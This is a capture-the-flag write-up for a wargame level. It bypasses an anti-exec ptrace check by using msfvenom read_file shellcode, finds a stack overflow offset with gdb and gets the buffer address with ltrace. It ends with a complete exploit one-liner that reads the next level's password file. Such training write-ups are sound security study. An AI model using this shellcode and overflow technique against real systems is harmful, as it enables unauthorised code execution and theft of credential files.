# Level04

## Limitations

```c
    do {
      ...
      last_instr = ptrace(PTRACE_PEEKUSER,pid,44,0);
    } while (last_instr != 0xb);
    puts("no exec() for you");
    kill(pid,9);
```

We can see that the program forks and traces child's functions calls to kill the said child if it calls exec.

## Shellcode

We need a shellcode that doesn't call exec. We can generate one that only reads in "/home/users/level05/.pass" with msfvenom.

```shell
$ msfvenom -p linux/x86/read_file PATH=/home/users/level05/.pass -b "\x00" -f c -v shellcode
"\xbb\x2c\xce\x5a\x7d\xda\xd1\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x16\x31\x5a\x15\x83\xea\xfc\x03\x5a\x11\xe2\xd9\x25\x6c\xc5\x24\xba\x91\x35\x7d\x8b\x58\xf8\x01\x62\x99\xbb\x02\x75\x1e\xbc\x8d\x92\x97\x45\x37\x5c\xb8\xb5\x47\x90\x38\x3c\x85\x92\x3d\x3f\x09\xe3\x86\x3e\x09\xe3\xf8\x8d\x89\x5b\xf9\x0d\x89\x9b\x41\x0d\x89\x9b\xb5\xc3\x09\x73\x70\x24\xf6\x7b\x54\xb3\x67\xe9\xce\x6c\x02\x82\x75\x01\x9f\x4b\x1a\x80\x29\xf1\x8e\x7a\xe0\xd6\x60\x0b\x6b\x5a\x0e\xeb"
```

## Shellcode injection

We can inject shellcode in the buffer

## Buffer overflow offest

We can find the buffer overflow offset with a mask and gdb.

```shell
$ gdb ./level04
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 2608]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2608]
0x41326641 in ?? ()
```

That gives us an offset of 156.

## Shellcode address

To get the shellcode address we just need to run the program with ltrace and get the first arg of the call to `gets`.

```shell
env -i ltrace -f ./level04
...
[pid 2627] gets(-8736, 0, 0, 0, 2944
...
```

## Exploit

```shell
$ python -c 'print "\xbb\x2c\xce\x5a\x7d\xda\xd1\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x16\x31\x5a\x15\x83\xea\xfc\x03\x5a\x11\xe2\xd9\x25\x6c\xc5\x24\xba\x91\x35\x7d\x8b\x58\xf8\x01\x62\x99\xbb\x02\x75\x1e\xbc\x8d\x92\x97\x45\x37\x5c\xb8\xb5\x47\x90\x38\x3c\x85\x92\x3d\x3f\x09\xe3\x86\x3e\x09\xe3\xf8\x8d\x89\x5b\xf9\x0d\x89\x9b\x41\x0d\x89\x9b\xb5\xc3\x09\x73\x70\x24\xf6\x7b\x54\xb3\x67\xe9\xce\x6c\x02\x82\x75\x01\x9f\x4b\x1a\x80\x29\xf1\x8e\x7a\xe0\xd6\x60\x0b\x6b\x5a\x0e\xeb" + "a" * 42 + "\xe0\xdd\xff\xff"' | env -i ./level04
```
